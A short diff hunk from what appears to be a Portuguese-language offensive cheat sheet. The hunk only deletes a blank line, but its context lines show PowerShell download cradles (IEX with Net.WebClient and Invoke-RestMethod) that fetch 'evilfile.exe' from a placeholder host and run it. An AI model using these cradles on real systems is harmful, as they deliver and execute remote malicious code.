@@ -2666,7 +2666,6 @@ IEX (New-Object Net.WebClient).DownloadString('https://domain.com/evilfile.exe')
 Invoke-RestMethod (IRM) e Invoke-Expression (IEX)
 ```ps
 Invoke-RestMethod -Method Get -Uri 'https://domain.com/evilfile.exe' | IEX
-
 IEX (Invoke-RestMethod -Method Get -Uri 'https://domain.com/evilfile.exe')
 ```
 
